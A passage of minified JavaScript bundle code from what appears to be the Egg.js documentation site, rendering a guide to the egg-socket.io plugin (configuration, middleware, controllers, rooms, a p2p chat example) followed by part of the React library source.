t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"/xLo":function(e,t,n){var a=n("0mt+"),r=n("V2dk");a({target:"Set",stat:!0},{from:r})},"/xmG":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,"Socket.IO")," is a real-time application framework based on Node.js, which has a wide range of applications including instant messaging, notification and message push, real-time analysis and other scenarios."),r.a.createElement("p",null,"WebSocket originated from the growing demand for real-time communication in web development, compared with http-based polling, which greatly saves network bandwidth and reduces server performance consumption. ",r.a.createElement(l["Link"],{to:"https://socket.io/"},"Socket.IO")," supports both websockets and polling. The data transmission method is compatible with the browser and does not support the communication requirements under the WebSocket scenario."),r.a.createElement("p",null,"The framework provides the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," plugin with the following development rules added:"),r.a.createElement("ul",null,r.a.createElement("li",null,"namespace: define the namespace by means of configuration \xa0- middleware: establish / disconnect every socket connection, preprocess every message / data transfer \xa0- controller: response socket.io event \xa0- router: unify the processing configuration of socket.io event and frame routing")),r.a.createElement("h2",{id:"install-egg-socketio"},r.a.createElement(l["AnchorLink"],{to:"#install-egg-socketio","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"install egg-socket.io"),r.a.createElement("h3",{id:"installation"},r.a.createElement(l["AnchorLink"],{to:"#installation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Installation"),r.a.createElement(o["a"],{code:"$ npm i egg-socket.io --save",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Enable the plugin:")),r.a.createElement(o["a"],{code:"// {app_root} /config/plugin.js\nexports.io = {\n  enable: true,\n  package: 'egg-socket.io',\n};",lang:"js"}),r.a.createElement("h3",{id:"configuration"},r.a.createElement(l["AnchorLink"],{to:"#configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement(o["a"],{code:"// {app_root} / config / config. $ {env} .js\nexports.io = {\n  init: {}, // passed to engine.io\n  namespace: {\n    '/': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n    '/ example': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n  },\n};",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Namespaces are ",r.a.createElement("code",null,"/")," and ",r.a.createElement("code",null,"/ example"),", not",r.a.createElement("code",null,"example"))),r.a.createElement("h4",{id:"uws"},r.a.createElement(l["AnchorLink"],{to:"#uws","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"uws")),r.a.createElement("p",null,r.a.createElement("strong",null,"Egg's socket is using ",r.a.createElement("code",null,"ws"),", ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/uws"},"uws")," is deprecated due to ",r.a.createElement(l["Link"],{to:"https://github.com/socketio/socket.io/issues/3319"},"some reasons"),"."),"If you insist using ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/uws"},"uws")," instead of the default ",r.a.createElement("code",null,"ws"),", you can config like this:"),r.a.createElement(o["a"],{code:"// {app_root} / config / config. $ {env} .js\nexports.io = {\n  init: { wsEngine: 'uws' }, // default: ws\n};",lang:"js"}),r.a.createElement("h4",{id:"redis"},r.a.createElement(l["AnchorLink"],{to:"#redis","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"redis")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," has built-in redis support via ",r.a.createElement("code",null,"socket.io-redis"),". In cluster mode, the use of redis can make it relatively simple to achieve information sharing of clients/rooms and so on"),r.a.createElement(o["a"],{code:"// {app_root} / config / config. $ {env} .js\nexports.io = {\n\xa0\xa0redis: {\n\xa0\xa0\xa0\xa0host: {redis server host}\n\xa0\xa0\xa0\xa0port: {redis server port},\n\xa0\xa0\xa0\xa0auth_pass: {redis server password},\n\xa0\xa0\xa0\xa0db: 0,\n\xa0\xa0},\n};",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"When ",r.a.createElement("code",null,"redis")," is turned on, the program tries to connect to the redis server at startup Here ",r.a.createElement("code",null,"redis")," is only used to store connection instance information, see ",r.a.createElement(l["Link"],{to:"https://socket.io/docs/server-api/#server-adapter-value"},"# server.adapter"))),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:"),"If the project also uses the ",r.a.createElement("code",null,"egg-redis"),", please configure it separately. Do not share it."),r.a.createElement("h3",{id:"deployment"},r.a.createElement(l["AnchorLink"],{to:"#deployment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Deployment"),r.a.createElement("p",null,"If the framework is started in cluster mode, the socket.io protocol implementation needs sticky feature support, otherwise it will not work in multi-process mode."),r.a.createElement("p",null,"Due to the design of socket.io, a multi-process server must be in the sticky working mode. As a result, you need the need to pass parameter ",r.a.createElement("code",null,"--sticky")," when starting the cluster."),r.a.createElement("p",null,"Modify the ",r.a.createElement("code",null,"npm scripts")," script in",r.a.createElement("code",null,"package.json"),":"),r.a.createElement(o["a"],{code:'{\n\xa0\xa0"scripts": {\n\xa0\xa0\xa0\xa0"dev": "egg-bin dev --sticky",\n\xa0\xa0\xa0\xa0"start": "egg-scripts start --sticky"\n\xa0\xa0}\n}',lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Nginx configuration")),r.a.createElement(o["a"],{code:'location / {\n\xa0\xa0proxy_set_header Upgrade $ http_upgrade;\n\xa0\xa0proxy_set_header Connection "upgrade";\n\xa0\xa0proxy_set_header X-Forwarded-For $ proxy_add_x_forwarded_for;\n\xa0\xa0proxy_set_header Host $ host;\n\xa0\xa0proxy_pass http://127.0.0.1:7001;\n}',lang:"unknown"}),r.a.createElement("h2",{id:"using-egg-socketio"},r.a.createElement(l["AnchorLink"],{to:"#using-egg-socketio","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using ",r.a.createElement("code",null,"egg-socket.io")),r.a.createElement("p",null,"The directory structure of project which has enabled the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," is as follows:"),r.a.createElement(o["a"],{code:"chat\n\u251c\u2500\u2500 app\n\u2502 \u251c\u2500\u2500 extend\n\u2502 \u2502 \u2514\u2500\u2500 helper.js\n\u2502 \u251c\u2500\u2500 io\n\u2502 \u2502 \u251c\u2500\u2500 controller\n\u2502 \u2502 \u2502 \u2514\u2500\u2500 default.js\n\u2502 \u2502 \u2514\u2500\u2500 middleware\n\u2502 \u2502 \u251c\u2500\u2500 connection.js\n\u2502 \u2502 \u2514\u2500\u2500 packet.js\n\u2502 \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2514\u2500\u2500 package.json",lang:"unknown"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Note: The corresponding files are in the app / io directory")),r.a.createElement("h3",{id:"middleware"},r.a.createElement(l["AnchorLink"],{to:"#middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Middleware"),r.a.createElement("p",null,"Middleware has the following two scenarios:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Connection"),r.a.createElement("li",null,"Packet")),r.a.createElement("p",null,"It is configured in each namespace, respectively, according to the scenarios given above."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")),r.a.createElement("p",null,"If we enable the framework middleware, you will find the following directory in the project:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app / middleware"),": framework middleware"),r.a.createElement("li",null,r.a.createElement("code",null,"app / io / middleware"),": plugin middleware")),r.a.createElement("p",null,"the difference:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Framework middleware is based on http model design to handle http requests."),r.a.createElement("li",null,"Plugin middleware based socket model design, processing socket.io request.")),r.a.createElement("p",null,"Although the framework tries to unify the style through plugins, it is important to note that their usage scenarios are different. For details, please see: ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/1416"},"# 1416")),r.a.createElement("h4",{id:"connection"},r.a.createElement(l["AnchorLink"],{to:"#connection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Connection"),r.a.createElement("p",null,"Fires when each client connects or quits. Therefore, we usually perform authorization authentication at this step, and deal with the failed clients."),r.a.createElement(o["a"],{code:"// {app_root} /app/io/middleware/connection.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    ctx.socket.emit('res', 'connected!');\n    await next(); // execute when disconnect.\n    console.log('disconnection!');\n  };\n};",lang:"js"}),r.a.createElement("p",null,"Kick out the user example:"),r.a.createElement(o["a"],{code:"const tick = (id, msg) => {\n  logger.debug('# tick', id, msg);\n  socket.emit(id, msg);\n  app.io.of('/').adapter.remoteDisconnect(id, true, (err) => {\n    logger.error(err);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"At the same time, the current connection can also be simple to deal with:"),r.a.createElement(o["a"],{code:"// {app_root} /app/io/middleware/connection.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    if (true) {\n      ctx.socket.disconnect();\n      return;\n    }\n    await next();\n    console.log('disconnection!');\n  };\n};",lang:"js"}),r.a.createElement("h4",{id:"packet"},r.a.createElement(l["AnchorLink"],{to:"#packet","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Packet"),r.a.createElement("p",null,"Acts on each data packet (each message). In the production environment, it is usually used to preprocess messages, or it is used to decrypt encrypted messages."),r.a.createElement(o["a"],{code:"// {app_root} /app/io/middleware/packet.js\nmodule.exports = (app) => {\n  return async (ctx, next) => {\n    ctx.socket.emit('res', 'packet received!');\n    console.log('packet:', ctx.packet);\n    await next();\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"controller"},r.a.createElement(l["AnchorLink"],{to:"#controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement("p",null,"A controller deals with the events sent by the client. Since it inherits the ",r.a.createElement("code",null,"egg.controller"),", it has the following member objects:"),r.a.createElement("ul",null,r.a.createElement("li",null,"ctx"),r.a.createElement("li",null,"app"),r.a.createElement("li",null,"service"),r.a.createElement("li",null,"config"),r.a.createElement("li",null,"logger")),r.a.createElement("blockquote",null,r.a.createElement("p",null,"For details, refer to the [Controller] (../ basics / controller.md) documentation")),r.a.createElement(o["a"],{code:"// {app_root} /app/io/controller/default.js\n'use strict';\n\nconst Controller = require('egg').Controller;\n\nclass DefaultController extends Controller {\n  async ping() {\n    const { ctx, app } = this;\n    const message = ctx.args[0];\n    await ctx.socket.emit('res', `Hi! I've got your message: $ {message}`);\n  }\n}\n\nmodule.exports = DefaultController;\n\n// or async functions\n\nexports.ping = async function () {\n  const message = this.args[0];\n  await this.socket.emit('res', `Hi! I've got your message: $ {message}`);\n};",lang:"js"}),r.a.createElement("h3",{id:"router"},r.a.createElement(l["AnchorLink"],{to:"#router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router"),r.a.createElement("p",null,"Routing is responsible for passing various events received by the socket to the corresponding controllers."),r.a.createElement(o["a"],{code:"// {app_root} /app/router.js\n\nmodule.exports = (app) => {\n  const { router, controller, io } = app; // default\n  router.get('/', controller.home.index); // socket.io\n  io.of('/').route('server', io.controller.home.server);\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")),r.a.createElement("p",null,"Nsp has the following system events:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"disconnecting")," doing the disconnect"),r.a.createElement("li",null,r.a.createElement("code",null,"disconnect")," connection has disconnected."),r.a.createElement("li",null,r.a.createElement("code",null,"error")," Error occurred")),r.a.createElement("h3",{id:"namespaceroom"},r.a.createElement(l["AnchorLink"],{to:"#namespaceroom","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Namespace/Room"),r.a.createElement("h4",{id:"namespace-nsp"},r.a.createElement(l["AnchorLink"],{to:"#namespace-nsp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Namespace (nsp)"),r.a.createElement("p",null,'The namespace is usually meant to be assigned to different access points or paths. If the client does not specify a nsp, it is assigned to "/" by default.'),r.a.createElement("p",null,"In socket.io we use the ",r.a.createElement("code",null,"of")," to divide the namespace; given that nsp is usually pre-defined and relatively fixed, the framework encapsulates it and uses configuration to partition different namespaces."),r.a.createElement(o["a"],{code:"// socket.io\nvar nsp = io.of('/my-namespace');\nnsp.on('connection', function (socket) {\n  console.log('someone connected');\n});\nnsp.emit('hi', 'everyone!');\n\n// egg\nexports.io = {\n  namespace: {\n    '/': {\n      connectionMiddleware: [],\n      packetMiddleware: [],\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"room"},r.a.createElement(l["AnchorLink"],{to:"#room","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Room"),r.a.createElement("p",null,"Room exists in nsp and is added or left by the join/leave method; the method used in the framework is the same;"),r.a.createElement(o["a"],{code:"Const room = 'default_room';\n\nModule.exports = app => {\n\xa0\xa0 return async (ctx, next) => {\n\xa0\xa0\xa0\xa0 ctx.socket.join(room);\n\xa0\xa0\xa0\xa0 ctx.app.io.of('/').to(room).emit('online', { msg: 'welcome', id: ctx.socket.id });\n\xa0\xa0\xa0\xa0 await next();\n\xa0\xa0\xa0\xa0 console.log('disconnection!');\n\xa0\xa0 };\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")," Each socket connection will have a random and unpredictable unique id ",r.a.createElement("code",null,"Socket#id")," and will automatically be added to the room named after this ",r.a.createElement("code",null,"id")),r.a.createElement("h2",{id:"examples"},r.a.createElement(l["AnchorLink"],{to:"#examples","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Examples"),r.a.createElement("p",null,"Here we use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," to do a small example which supports p2p chat"),r.a.createElement("h3",{id:"client"},r.a.createElement(l["AnchorLink"],{to:"#client","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Client"),r.a.createElement("p",null,"The UI-related content is not rewritten. It can be called via window.socket"),r.a.createElement(o["a"],{code:"// browser\nconst log = console.log;\n\nwindow.onload = function () {\n  // init\n  const socket = io('/', {\n    // Actual use can pass parameters here\n    query: {\n      room: 'demo',\n      userId: `client_${Math.random()}`,\n    },\n\n    transports: ['websocket'],\n  });\n\n  socket.on('connect', () => {\n    const id = socket.id;\n\n    log('#connect,', id, socket); // receive online user information\n\n    // listen for its own id to implement p2p communication\n    socket.on(id, (msg) => {\n      log('#receive,', msg);\n    });\n  });\n\n  socket.on('online', (msg) => {\n    log('#online,', msg);\n  });\n\n  // system events\n  socket.on('disconnect', (msg) => {\n    log('#disconnect', msg);\n  });\n\n  socket.on('disconnecting', () => {\n    log('#disconnecting');\n  });\n\n  socket.on('error', () => {\n    log('#error');\n  });\n\n  window.socket = socket;\n};",lang:"js"}),r.a.createElement("h4",{id:"wechat-applets"},r.a.createElement(l["AnchorLink"],{to:"#wechat-applets","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"WeChat Applets"),r.a.createElement("p",null,"The API provided by the WeChat applet is WebSocket, and socket.io is the upper encapsulation of Websocket. Therefore, we cannot directly use the API connection of the applet. You can use something like [wxapp-socket-io] (",r.a.createElement(l["Link"],{to:"https://github.com/wxsocketio"},"https://github.com/wxsocketio")," /wxapp-socket-io) to adapt to the library."),r.a.createElement("p",null,"The sample code is as follows:"),r.a.createElement(o["a"],{code:"// Small program-side sample code\nimport io from 'vendor/wxapp-socket-io.js';\n\nconst socket = io('ws://127.0.0.1:7001');\nsocket.on('connect', function () {\n  socket.emit('chat', 'hello world!');\n});\nsocket.on('res', (msg) => {\n  console.log('res from server: %s!', msg);\n});",lang:"js"}),r.a.createElement("h3",{id:"server"},r.a.createElement(l["AnchorLink"],{to:"#server","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Server"),r.a.createElement("p",null,"The following is part of the demo code and explains the role of each method:"),r.a.createElement("h4",{id:"config"},r.a.createElement(l["AnchorLink"],{to:"#config","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Config"),r.a.createElement(o["a"],{code:"// {app_root}/config/config.${env}.js\nexports.io = {\n  namespace: {\n    '/': {\n      connectionMiddleware: ['auth'],\n      packetMiddleware: [], // processing for message is not implemented temporarily\n    },\n  }, // Data sharing through redis in cluster mode\n\n  redis: {\n    host: '127.0.0.1',\n    port: 6379,\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Framework extensions for encapsulating data formats"),r.a.createElement(o["a"],{code:"// {app_root}/app/extend/helper.js\n\nmodule.exports = {\n  parseMsg(action, payload = {}, metadata = {}) {\n    const meta = Object.assign(\n      {},\n      {\n        timestamp: Date.now(),\n      },\n      metadata,\n    );\n\n    return {\n      data: {\n        action,\n        payload,\n      },\n      meta,\n    };\n  },\n};",lang:"js"}),r.a.createElement("p",null,"Format\uff1a"),r.a.createElement(o["a"],{code:"{\n  data: {\n    action: 'exchange',  // 'deny' || 'exchange' || 'broadcast'\n    payload: {},\n  },\n  meta:{\n    timestamp: 1512116201597,\n    client: '/webrtc#nNx88r1c5WuHf9XuAAAB',\n    target: '/webrtc#nNx88r1c5WuHf9XuAAAB'\n  },\n}",lang:"js"}),r.a.createElement("h4",{id:"middleware-1"},r.a.createElement(l["AnchorLink"],{to:"#middleware-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Middleware"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")," middleware handles socket connection handling"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/middleware/auth.js\n\nconst PREFIX = 'room';\n\nmodule.exports = () => {\n  return async (ctx, next) => {\n    const { app, socket, logger, helper } = ctx;\n    const id = socket.id;\n    const nsp = app.io.of('/');\n    const query = socket.handshake.query; // User Info\n\n    const { room, userId } = query;\n    const rooms = [room];\n\n    logger.debug('#user_info', id, room, userId);\n\n    const tick = (id, msg) => {\n      logger.debug('#tick', id, msg); // Send message before kicking user\n\n      socket.emit(id, helper.parseMsg('deny', msg)); // Call the adapter method to kick out the user and the client triggers the disconnect event\n\n      nsp.adapter.remoteDisconnect(id, true, (err) => {\n        logger.error(err);\n      });\n    }; // Check if the room exists, kick it out if it doesn't exist // Note: here app.redis has nothing to do with the plugin, it can be replaced by other storage\n\n    const hasRoom = await app.redis.get(`${PREFIX}:${room}`);\n\n    logger.debug('#has_exist', hasRoom);\n\n    if (!hasRoom) {\n      tick(id, {\n        type: 'deleted',\n        message: 'deleted, room has been deleted.',\n      });\n      return;\n    } // When the user joins\n\n    nsp.adapter.clients(rooms, (err, clients) => {\n      // Append current socket information to clients\n      clients[id] = query; // Join room\n\n      socket.join(room);\n\n      logger.debug('#online_join', _clients); // Update online user list\n\n      nsp.to(room).emit('online', {\n        clients,\n        action: 'join',\n        target: 'participator',\n        message: `User(${id}) joined.`,\n      });\n    });\n\n    await next(); // When the user leaves\n\n    nsp.adapter.clients(rooms, (err, clients) => {\n      logger.debug('#leave', room);\n\n      const _clients = {};\n      clients.forEach((client) => {\n        const _id = client.split('#')[1];\n        const _client = app.io.sockets.sockets[_id];\n        const _query = _client.handshake.query;\n        _clients[client] = _query;\n      });\n\n      logger.debug('#online_leave', _clients); // Update online user list\n\n      nsp.to(room).emit('online', {\n        clients: _clients,\n        action: 'leave',\n        target: 'participator',\n        message: `User(${id}) leaved.`,\n      });\n    });\n  };\n};",lang:"js"}),r.a.createElement("h4",{id:"controller-1"},r.a.createElement(l["AnchorLink"],{to:"#controller-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller"),r.a.createElement("p",null,"Data exchange of P2P communication is through exchange"),r.a.createElement(o["a"],{code:"// {app_root}/app/io/controller/nsp.js\nconst Controller = require('egg').Controller;\n\nclass NspController extends controller {\n  async exchange() {\n    const { ctx, app } = this;\n    const nsp = app.io.of('/');\n    const message = ctx.args[0] || {};\n    const socket = ctx.socket;\n    const client = socket.id;\n\n    try {\n      const { target, payload } = message;\n      if (!target) return;\n      const msg = ctx.helper.parseMsg('exchange', payload, { client, target });\n      nsp.emit(target, msg);\n    } catch (error) {\n      app.logger.error(error);\n    }\n  }\n}\n\nmodule.exports = NspController;",lang:"js"}),r.a.createElement("h4",{id:"router-1"},r.a.createElement(l["AnchorLink"],{to:"#router-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router"),r.a.createElement(o["a"],{code:"// {app_root}/app/router.js\nmodule.exports = (app) => {\n  const { router, controller, io } = app;\n  router.get('/', controller.home.index); // socket.io\n\n  io.of('/').route('exchange', io.controller.nsp.exchange);\n};",lang:"js"}),r.a.createElement("p",null,"Open two tab pages and call up the console:"),r.a.createElement(o["a"],{code:"socket.emit('exchange', {\n  target: '/webrtc#Dkn3UXSu8_jHvKBmAAHW',\n  payload: {\n    msg: 'test',\n  },\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("img",{src:"https://raw.githubusercontent.com/eggjs/egg/master/docs/assets/socketio-console.png",alt:""})),r.a.createElement("h2",{id:"reference-links"},r.a.createElement(l["AnchorLink"],{to:"#reference-links","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Reference Links"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://socket.io/"},"socket.io")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io"},"egg-socket.io")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-socket.io/tree/master/example"},"egg-socket.io example")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},0:function(e,t,n){e.exports=n("TmB2")},"00LS":function(e,t,n){"use strict";t["a"]={items_per_page:"/ page",jump_to:"Go to",jump_to_confirm:"confirm",page:"Page",prev_page:"Previous Page",next_page:"Next Page",prev_5:"Previous 5 Pages",next_5:"Next 5 Pages",prev_3:"Previous 3 Pages",next_3:"Next 3 Pages",page_size:"Page Size"}},"09W1":function(e,t){function n(e){var t=typeof e;return null!=e&&("object"==t||"function"==t)}e.exports=n},"0Lmz":function(e,t,n){"use strict";var a=n("G0Yp"),r="function"===typeof Symbol&&Symbol.for,l=r?Symbol.for("react.element"):60103,o=r?Symbol.for("react.portal"):60106,i=r?Symbol.for("react.fragment"):60107,c=r?Symbol.for("react.strict_mode"):60108,s=r?Symbol.for("react.profiler"):60114,u=r?Symbol.for("react.provider"):60109,d=r?Symbol.for("react.context"):60110,m=r?Symbol.for("react.forward_ref"):60112,p=r?Symbol.for("react.suspense"):60113,h=r?Symbol.for("react.memo"):60115,g=r?Symbol.for("react.lazy"):60116,f="function"===typeof Symbol&&Symbol.iterator;function E(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var b={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},v={};function y(e,t,n){this.props=e,this.context=t,this.refs=v,this.updater=n||b}function k(){}function w(e,t,n){this.props=e,this.context=t,this.refs=v,this.updater=n||b}y.prototype.isReactComponent={},y.prototype.setState=function(e,t){if("object"!==typeof e&&"function"!==typeof e&&null!=e)throw Error(E(85));this.updater.enqueueSetState(this,e,t,"setState")},y.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},k.prototype=y.prototype;var x=w.prototype=new k;x.constructor=w,a(x,y.prototype),x.isPureReactComponent=!0;var j={current:null},S=Object.prototype.hasOwnProperty,C={key:!0,ref:!0,__self:!0,__source:!0};function A(e,t,n){var a,r={},o=null,i=null;if(null!=t)for(a in void 0!==t.ref&&(i=t.ref),void 0!==t.key&&(o=""+t.key),t)S.call(t,a)&&!C.hasOwnProperty(a)&&(r[a]=t[a]);var c=arguments.length-2;if(1===c)r.children=n;else if(1<c){for(var s=Array(c),u=0;u<c;u++)s[u]=arguments[u+2];r.children=s}if(e&&e.defaultProps)for(a in c=e.defaultProps,c)void 0===r[a]&&(r[a]=c[a]);return{$$typeof:l,type:e,key:o,ref:i,props:r,_owner:j.current}}function L(e,t){return{$$typeof:l,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function T(e){return"object"===typeof e&&null!==e&&e.$$typeof===l}function N(e){var t={"=":"=0",":":"=2"};return"$"+(""+e).replace(/[=:]/g,(function(e){return t[e]}))}var O=/\/+/g,I=[];function P(e,t,n,a){if(I.length){var r=I.pop();return r.result=e,r.keyPrefix=t,r.func=n,r.context=a,r.count=0,r}return{result:e,keyPrefix:t,func:n,context:a,count:0}}function R(e){e.result=null,e.keyPrefix=null,e.func=null,e.context=null,e.count=0,10>I.length&&I.push(e)}function _(e,t,n,a){var r=typeof e;"undefined"!==r&&"boolean"!==r||(e=null);var i=!1;if(null===e)i=!0;else switch(r){case"string":case"number":i=!0;break;case"object":switch(e.$$typeof){case l:case o:i=!0}}if(i)return n(a,e,""===t?"."+M(e,0):t),1;if(i=0,t=""===t?".":t+":",Array.isArray(e))for(var c=0;c<e.length;c++){r=e[c];var s=t+M(r,c);i+=_(r,s,n,a)}else if(null===e||"object"!==typeof e?s=null:(s=f&&e[f]||e["@@iterator"],s="function"===typeof s?s:null),"function"===typeof s)for(e=s.call(e),c=0;!(r=e.next()).done;)r=r.value,s=t+M(r,c++),i+=_(r,s,n,a);else if("object"===r)throw n=""+e,Error(E(31,"[object Object]"===n?"object with keys {"+Object.keys(e).join(", ")+"}":n,""));return i}function q(e,t,n){return null==e?0:_(e,"",t,n)}function M(e,t){return"object"===typeof e&&null!==e&&null!=e.key?N(e.key):t.toString(36)}function F(e,t){e.func.call(e.context,t,e.count++)}function D(e,t,n){var a=e.result,r=e.keyPrefix;e=e.func.call(e.context,t,e.count++),Array.isArray(e)?U(e,a,n,(function(e){return e})):null!=e&&(T(e)&&(e=L(e,r+(!e.key||t&&t.key===e.key?"":(""+e.key).replace(O,"$&/")+"/")+n)),a.push(e))}function U(e,t,n,a,r){var l="";null!=n&&(l=(""+n).replace(O,"$&/")+"/"),t=P(t,l,a,r),q(e,D,t),R(t)}var z={current:null};function H(){var e=z.current;if(null===e)throw Error(E(321));return e}var B={ReactCurrentDispatcher:z,ReactCurrentBatchConfig:{suspense:null},ReactCurrentOwner:j,IsSomeRendererActing:{current:!1},assign:a};t.Children={map:function(e,t,n){if(null==e)return e;var a=[];return U(e,a,null,t,n),a},forEach:function(e,t,n){if(null==e)return e;t=P(null,null,t,n),q(e,F,t),R(t)},count:function(e){return q(e,(function(){return null}),null)},toArray:function(e){var t=[];return U(e,t,null,(function(e){return e})),t},only:function(e){if(!T(e))throw Error(E(143));return e}},t.Component=y,t.Fragment=i,t.Profiler=s,t.PureComponent=w,t.StrictMode=c,t.Suspense=p,t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=B,t.cloneElement=function(e,t,n){if(null===e||void 0===e)throw Error(E(267,e));var r=a({},e.props),o=e.key,i=e.ref,c=e._owner;if(null!=t){if(void 0!==t.ref&&(i=t.ref,c=j.current),void 0!==t.key&&(o=""+t.key),e.type&&e.type.defaultProps)var s=e.type.defaultProps;for(u in t)S.call(t,u)&&!C.hasOwnProperty(u)&&(r[u]=void 0===t[u]&&void 0!==s?s[u]:t[u])}var u=arguments.length-2;if(1===u)r.children=n;else if(1<u){s=Array(u);for(var d=0;d<u;d++)s[d]=arguments[d+2];r.children=s}return{$$typeof:l,type:e.type,key:o,ref:i,props:r,_owner:c}},t.createContext=function(e,t){return void 0===t&&(t=null),e={$$typeof:d,_calculateChangedBits:t,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null},e.Provider={$$typeof:u,_context:e},e.Consumer=e},t.createElement=A,t.createFactory=function(e){var t=A.bind(null,e);return t.type=e,t},t.createRef=function(){return{current:null}},t.forwardRef=function(e){return{$$typeof:m,render:e}},t.isValidElement=T,t.lazy=function(e){return{$$typeof:g,_ctor:e,_status:-1,_result:null}},t.memo=function(e,t){return{$$typeof:h,type:e,compare:void 0===t?null:t}},t.useCallback=function(e,t){return H().useCallback(e,t)},t.useContext=function(e,t){return H().useContext(e,t)},t.useDebugValue=function(){},t.useEffect=function(e,t){return 